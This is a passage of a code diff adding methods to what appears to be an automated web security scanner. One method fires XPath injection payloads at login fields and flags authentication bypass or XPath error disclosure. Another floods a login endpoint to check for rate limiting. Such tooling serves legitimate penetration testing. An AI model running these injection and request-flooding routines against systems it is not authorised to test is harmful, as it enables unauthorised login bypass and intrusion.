+        logger.debug(f"[XPATH] Mode: {'full (test all)' if is_full_mode else 'quick (stop at first success)'}")
+
+        for idx, payload in enumerate(xpath_payloads, 1):
+            try:
+                data = {
+                    username_field or 'email': payload,
+                    password_field or 'password': payload
+                }
+
+                logger.debug(f"[XPATH] [{idx}/{len(xpath_payloads)}] Testing payload: {payload}")
+
+                response = self._make_csrf_request(endpoint, data, use_json=True)
+
+                if response is None:
+                    logger.debug(f"[XPATH] [{idx}] No response received")
+                    continue
+
+                response_text = response.text.lower() if response.text else ""
+                response_preview = response.text[:200] if response.text else "(empty)"
+
+                logger.debug(f"[XPATH] [{idx}] Status: {response.status_code}, Length: {len(response.text) if response.text else 0}")
+                logger.debug(f"[XPATH] [{idx}] Response preview: {response_preview}")
+
+                if response.status_code in [200, 302]:
+                    success_indicators = ['token', 'session', 'authentication', 'success', 'welcome']
+                    found_success = [kw for kw in success_indicators if kw.lower() in response_text]
+                    found_failure = [kw for kw in failure_keywords if kw.lower() in response_text]
+
+                    logger.debug(f"[XPATH] [{idx}] Success indicators found: {found_success}")
+                    logger.debug(f"[XPATH] [{idx}] Failure indicators found: {found_failure}")
+
+                    if found_success and not found_failure:
+                        logger.info(f"✓ XPath Injection successful with payload: {payload[:30]}...")
+                        logger.debug(f"[XPATH] [{idx}] ✓ AUTH BYPASS DETECTED!")
+                        result["successful_payloads"].append(payload)
+                        result["status"] = "Successful"
+                        result["confidence_score"] = 100
+                        result["confidence_level"] = "High"
+                        if not is_full_mode:
+                            return result
+                        continue
+
+                xpath_errors = [
+                    'xpath', 'xpath exception', 'xpath syntax', 'invalid predicate',
+                    'invalid expression', 'xml path', 'xpath evaluation', 'libxml',
+                    'xml parser', 'xpathexpression', 'unknown function', 'invalid token'
+                ]
+                found_errors = [err for err in xpath_errors if err in response_text]
+
+                if found_errors:
+                    logger.info(f"✓ XPath error disclosure detected with payload: {payload[:30]}...")
+                    logger.debug(f"[XPATH] [{idx}] ✓ ERROR DISCLOSURE: {found_errors}")
+                    result["error_disclosures"].append(payload)
+                    result["status"] = "Successful"
+                    result["confidence_score"] = 90
+                    result["confidence_level"] = "High"
+                    if not is_full_mode:
+                        return result
+
+            except Exception as e:
+                logger.debug(f"Error testing XPath injection: {e}")
+                continue
+
+        if result["successful_payloads"] or result["error_disclosures"]:
+            total_found = len(result["successful_payloads"]) + len(result["error_disclosures"])
+            logger.info(f"✓ XPath Injection: {total_found} vulnerable payload(s) found")
+
+        return result
+    
+    def _test_api_rate_limit(self, endpoint: str, username_field: str,
+                            password_field: str, num_requests: int) -> dict:
+        """Test rate limiting on API endpoint"""
+        import json as json_lib
+        import time
+        
+        result = {
+            "status": "Failed",
+            "details": {}
+        }
+        
+        test_data = {
+            username_field or 'email': 'ratelimit_test@test.com',
+            password_field or 'password': 'ratelimit_test_password'
+        }
+        
+        rate_limited = False
+        rate_limited_at = None
+        response_times = []
+        
+        logger.debug(f"[RATE] Testing rate limiting with {num_requests} requests on {endpoint}")
+        logger.debug(f"[RATE] Test credentials: {test_data}")
+        
+        for i in range(num_requests):
+            try:
+                start_time = time.time()
+                
+                # Use CSRF-aware request method
+                response = self._make_csrf_request(endpoint, test_data, use_json=True)
+                
+                elapsed = time.time() - start_time
+                response_times.append(elapsed)
+                
+                if response is not None:
+                    # Log every request status
+                    logger.debug(f"[RATE] Request {i+1}/{num_requests}: Status={response.status_code}, Time={elapsed:.3f}s")
+                    
+                    # Check headers
+                    rate_headers_found = []
+                    rate_headers = ['x-ratelimit-remaining', 'x-rate-limit-remaining', 
+                                   'ratelimit-remaining', 'retry-after', 'x-ratelimit-limit']
+                    for header in rate_headers:
+                        header_value = response.headers.get(header)
+                        if header_value:
+                            rate_headers_found.append(f"{header}={header_value}")
+                    
+                    if rate_headers_found:
+                        logger.debug(f"[RATE] Request {i+1}: Rate limit headers: {', '.join(rate_headers_found)}")
+                        result["details"]["rate_limit_headers"] = True
+                    
+                    if response.status_code == 429:
+                        rate_limited = True
+                        rate_limited_at = i + 1
+                        logger.info(f"✓ Rate limiting detected at request {i + 1}")
+                        logger.debug(f"[RATE] ✓ 429 Too Many Requests received!")
+                        break
+                else:
+                    logger.debug(f"[RATE] Request {i+1}/{num_requests}: No response")
+                            
+            except Exception as e:
+                logger.debug(f"[RATE] Request {i + 1} error: {e}")
+        
+        if rate_limited:
+            result["status"] = "Successful"
+            result["details"]["rate_limited_at"] = rate_limited_at
+            result["severity"] = "Low"
+            result["confidence_score"] = 80
+            result["confidence_level"] = "High"
+            logger.debug(f"[RATE] ✓ Rate limiting IS implemented (triggered at request {rate_limited_at})")
+        else:
+            result["note"] = f"No rate limiting detected after {num_requests} requests"
+            result["severity"] = "Medium"
+            result["details"]["vulnerability"] = "Missing rate limiting"
+            result["confidence_score"] = 70
+            result["confidence_level"] = "Medium"
+            logger.debug(f"[RATE] ✗ No rate limiting detected after {num_requests} requests - VULNERABILITY")
+        
+        if response_times:
+            avg_time = sum(response_times) / len(response_times)
+            min_time = min(response_times)
+            max_time = max(response_times)
+            result["details"]["avg_response_time"] = avg_time
+            result["details"]["min_response_time"] = min_time
+            result["details"]["max_response_time"] = max_time
+            result["details"]["total_requests_sent"] = len(response_times)
+            logger.debug(f"[RATE] Response times - Avg: {avg_time:.3f}s, Min: {min_time:.3f}s, Max: {max_time:.3f}s")
+        
+        return result
